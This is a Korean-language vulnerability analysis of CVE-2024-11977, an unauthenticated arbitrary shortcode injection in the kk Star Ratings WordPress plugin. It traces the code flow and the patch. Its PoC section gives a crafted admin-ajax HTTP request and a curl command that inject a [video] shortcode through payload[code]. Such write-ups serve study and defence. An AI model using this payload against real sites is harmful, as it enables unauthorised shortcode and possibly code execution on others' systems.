# CVE-2024-11977

## Index
* [📌 Analysis](#📌-analysis)
    * [1. 개요](#1-개요)
    * [2. 취약점 분석](#2-취약점-분석)
* [📌 PoC](#📌-poc)
    * [1. 설명](#1-설명)
    * [2. PoC 코드](#2-poc-코드)
* [📌 패치 확인](#📌-패치-확인)


## 📌 Analysis

### 1. 개요

`CVE-2024-11977` 취약점은 WordPress 플러그인 `The The kk Star Ratings - Rate Post & Collect User Feedbacks`의 5.4.10 버전 이하에서 발생하는 임의 단축 코드(`do_shortcode`) 실행 취약점입니다.

해당 플러그인은 활성화되면 WordPress 게시글에 평점을 입력할 수 있는 요소가 나타납니다.

![image](images/image-001.png)

이때, 평점을 입력하면 서버로 전송되는 요청값이 적절한 검증 없이 `do_shortcode` 함수의 인자로 전달되어 임의의 단축 코드가 실행될 수 있습니다. 또한 인증되지 않은 사용자도 이 기능을 실행할 수 있어, 공격자가 WordPress의 단축 코드 기능을 악용하면 다음과 같은 보안 위험이 발생할 수 있습니다.

- **코드 실행 위험:** `do_shortcode`로 전달된 단축 코드가 처리될 때 PHP 함수가 실행 되며, 이때 악의적인 단축 코드를 삽입하여 임의의 PHP 코드를 실행할 수 있습니다.
- **정보 유출:** 단축 코드를 통해 데이터베이스 쿼리나 파일 시스템에 접근하여 중요한 정보를 탈취하거나 노출시킬 수 있습니다.
- **권한 우회:** 특정 단축 코드는 관리자 권한이 필요하지만, 검증되지 않은 단축 코드가 실행될 경우 일반 사용자가 관리자 권한이 필요한 단축 코드를 실행할 수 있습니다.
- **추가 공격 벡터**: XSS나 CSRF와 같은 다른 공격의 진입점으로 활용될 수 있습니다.
- **서비스 장애:** 무분별한 단축 코드 실행은 서버 리소스를 과도하게 소모하거나 무한 루프를 발생시켜 서비스 중단을 초래할 수 있습니다.

### 2. 취약점 분석

WordPress 플러그인 `The The kk Star Ratings - Rate Post & Collect User Feedbacks` 이 활성화된 상태에서 게시글의 평점을 클릭할 경우 아래의 HTTP Request 패킷이 발생하게 됩니다.

![image](images/image-002.png)

이때 Request Body 데이터 중 페이로드 `payload` 의 값은 다음과 같으며,

```php
[
    "align" => "left",
    "id" => 1,
    "slug" => "default", 
    "valign" => "top",
    "ignore" => "",
    "reference" => "auto",
    "class" => "",
    "count" => 4,
    "legendonly" => "",
    "readonly" => "",
    "score" => 4,
    "starsonly" => "",
    "best" => 5,
    "gap" => 5,
    "greet" => "Rate this post",
    "legend" => "4/5 - (4 votes)",
    "size" => 24,
    "title" => "Hello world!",
    "width" => 113.5,
    "_legend" => "{score}/{best} - ({count} {votes})",
    "font_factor" => 1.25
]
```

요청은 `/wp-content/plugins/kk-star-ratings/src/core/wp/actions/wp_ajax_kk-star-ratings.php` 파일의 `wp_ajax_kk_star_ratings` 함수에서 처리됩니다.

`wp_ajax_kk_star_ratings` 함수의 코드 구문을 살펴보면, **line 39**에서 변수 `$payload`에 요청 페이로드 `payload`의 값을 초기화합니다. 이후 **line 92**에서 이 값을 함수 `to_shortcode`의 두 번째 인자로 전달하고, 그 결과를 다시 `do_shortcode`의 인자로 전달한 뒤 해당 함수 `do_shortcode` 의 실행 결과를 HTTP 상태코드 `201`과 함께 응답합니다.

![image](images/image-003.png)

**line 92**의  `to_shortcode` 함수는 단축 코드를 생성하는 로직이 구현되어 있으며, 해당 함수는 `/wp-content/plugins/kk-star-ratings/src/functions/to_shortcode.php` 파일에 정의되어 있습니다.

![image](images/image-004.png)

해당 함수의 로직에 대한 출력 예제는 다음과 같습니다.

```php
<?php
// 1. 단순 숏코드 생성
echo to_shortcode('gallery', ['ids' => '1,2,3']);
// 결과: [gallery ids="1,2,3"]

// 2. 속성과 내용 포함
echo to_shortcode('div', ['id' => 'main', 'class' => 'container', 'data-role' => 'content'], 'Hello World');
// 결과: [div id="main" class="container" data-role="content"]Hello World[/div]

// 3. 속성이 없는 숏코드
echo to_shortcode('audio', [], '');
// 결과: [audio]
```

즉, 아까 확인한 HTTP Request Body 데이터의 페이로드 `payload` 의 값은 `to_shortcode` 함수로 전달될 경우 아래의 결과를 출력하게 됩니다. 

이때, `to_shortcode` 함수의 첫 번째 인자로 전달되는 `kksr('slug')`는 `kk-star-ratings`로 변환되었으며, 일부 존재하지 않거나 변경된 값들은 `wp_ajax_kk_star_ratings` 함수의 로직에 의해 처리된 것입니다.

```
[kk-star-ratings align="left" id="1" slug="default" valign="top" ignore="" reference="auto" class="" legendonly="" readonly="" starsonly="" best="5" gap="5" greet="Rate this post" legend="{score}/{best} - ({count} {votes})" size="24" title="Hello world!" width="113.5" _legend="{score}/{best} - ({count} {votes})" font_factor="1.25"]
```

따라서, 페이로드 `payload` 의 값은 `do_shortcode` 함수의 인자로 전달되므로 페이로드의 값을 조작하여 임의의 단축 코드를 실행할 수 있는 취약점이 발생하게 됩니다.

## 📌 PoC

### 1. 설명

평점을 기록할 때 발생하는 HTTP Request 패킷을 아래의 데이터로 요청합니다.

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost:8080
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 99

nonce=42d41f5dc3&action=kk-star-ratings&rating=5&payload[code]=][video+src=http://video.com+][video
```

![image](images/image-005.png)

이때, 요청 페이로드 `payload`는 다음과 같은 데이터로 전달됩니다.

```php
[ "code" => "][video src=http://video.com ][video" ]
```

전달된 `payload`는 `to_shortcode` 함수의 인자로 전달되어 다음과 같은 단축 코드로 변환됩니다.

```
[kk-star-ratings code="][video src=http://video.com ][video" id="0" slug="default" best="5" _legend="{score}/{best} - ({count} {votes})" legend="{score}/{best} - ({count} {votes})"]
```

이렇게 생성된 코드는 `[kk-start-ratings]`와 `[video]` 두 개의 단축 코드로 구성되며, 이는 `do_shortcode` 함수의 인자로 전달되어 아래의 응답 데이터를 생성합니다.

![image](images/image-006.png)

즉, 의도되지 않은 단축코드 `[video]` 가 실행 되어 `<a class="wp-embedded-video" href="http://video.com">http://video.com</a>` 가 반환된 것을 확인할 수 있습니다.

이러한 취약점을 통해 공격자는 WordPress의 모든 단축 코드를 실행할 수 있으며, 이는 WordPress 플러그인이나 테마에서 제공하는 단축 코드까지 포함됩니다. 특히 파일 업로드나 데이터베이스 조작과 관련된 단축 코드가 있다면 심각한 보안 위험이 발생할 수 있습니다.

### 2. PoC 코드

> 아래 요청 페이로드에서 사용되는 `nonce` 값은 평점 기록이 포함된 게시글 페이지에서 확인할 수 있습니다.
> 
> 
> ![image](images/image-007.png)
> 

```php
curl -X POST "http://localhost:8080/wp-admin/admin-ajax.php" \
	--data-urlencode "nonce=42d41f5dc3" \
	--data-urlencode "action=kk-star-ratings" \
	--data-urlencode "rating=5" \
	--data-urlencode "payload[code]=][video src=http://video.com ][video"
```

## 📌 패치 확인

해당 취약점의 패치는 요청 페이로드의 `payload`를 변수 `$payload`로 초기화한 후, `do_shortcode` 함수 호출 전에 `$payload['_legend']` 값이 있을 경우 `strip_shortcodes` 함수로 단축 코드를 제거하였습니다.

즉, `strip_shortcodes` 함수를 사용하여 요청 페이로드 `payload[_legend]`에서 단축 코드를 제거하도록 처리하였습니다.

> https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3208701%40kk-star-ratings&old=3202212%40kk-star-ratings&sfp_email=&sfph_mail=#file474
> 

![image](images/image-008.png)

다만, 해당 취약점의 패치는 요청 페이로드 `payload[_legend]` 에 대해서만 임의 단축코드 실행 취약점을 방지하고 있으며, 다른 페이로드 필드에 대해서는 여전히 취약점이 존재합니다.

예를 들어, `payload[code]`나 다른 필드를 통해 여전히 임의의 단축 코드를 실행할 수 있는 가능성이 있어 완전한 보안 패치라고 보기는 어렵습니다.